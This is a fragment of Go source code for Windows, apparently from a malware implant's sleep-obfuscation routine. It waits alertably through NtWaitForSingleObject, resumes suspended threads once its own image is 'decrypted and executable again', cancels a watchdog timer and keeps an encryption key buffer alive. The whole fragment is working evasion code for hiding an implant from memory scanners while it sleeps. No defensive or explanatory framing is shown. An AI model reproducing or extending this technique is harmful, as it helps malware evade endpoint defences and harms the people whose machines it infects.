	// interprets as "wait indefinitely."
	procNtWaitForSingleObject.Call(
		uintptr(windows.CurrentProcess()),
		1, // Alertable = TRUE
		0, // Timeout = NULL (INFINITE)
	)

	dbg("cycle=%d alertable wait returned", cycle)

	// -------- RESUME PEER GO Ms --------
	// Image is decrypted and executable again; peers are safe to run.
	resumePeers(cycle, suspendedTIDs)

	// DISARM THE WATCHDOG.
	// Sleep completed normally. Cancel the pending one-shot timer.
	// INVALID_HANDLE_VALUE as CompletionEvent tells DeleteTimerQueueTimer
	// to block until any in-flight callback finishes — necessary so the
	// callback can't be running (and dereferencing wdArgs) after Sleep
	// returns and wdArgs may be GC'd. The callback is fast and lives
	// entirely on a thread we never suspend, so this wait is bounded.
	if hWatchdogTimer != 0 {
		procDeleteTimerQueueTimer.Call(0, hWatchdogTimer, ^uintptr(0))
	}
	if wdArgs.fired.Load() {
		// The watchdog rescued us. Log it — this is our top-signal event.
		dbg("cycle=%d WATCHDOG RESCUED sleep (resumed=%d peers)",
			cycle, wdArgs.resumed.Load())
	}

	dbg("cycle=%d Sleep returning", cycle)

	// Keep the buffers referenced through the unmanaged execution above.
	// Go's escape analysis handles &args and &keyBuf, but an explicit
	// KeepAlive documents the invariant and is defensive against future
	// compiler changes.
	runtime.KeepAlive(keyBuf)
	runtime.KeepAlive(args)
	runtime.KeepAlive(wdArgs)

	return nil
}
